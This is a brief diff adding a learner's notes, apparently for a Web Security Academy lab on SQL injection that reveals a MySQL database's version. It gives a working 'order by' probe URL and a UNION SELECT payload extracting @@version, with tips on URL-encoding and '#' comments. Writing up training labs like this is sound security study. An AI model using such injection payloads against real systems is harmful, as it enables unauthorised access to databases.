@@ -1,0 +1,9 @@
+Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+Got valid response with following:
+https://ac6a1fbf1faf5758c0270b4b002a00b6.web-security-academy.net/filter?category=Pets'+order+by+1%23
+
+Turns out that I need to url encode the payload. Also must use # for comments
+
+Solved with following url encoded payload:
+GET /filter?category=Pets'union+select+'test',+%40%40version+%23+ HTTP/1.1
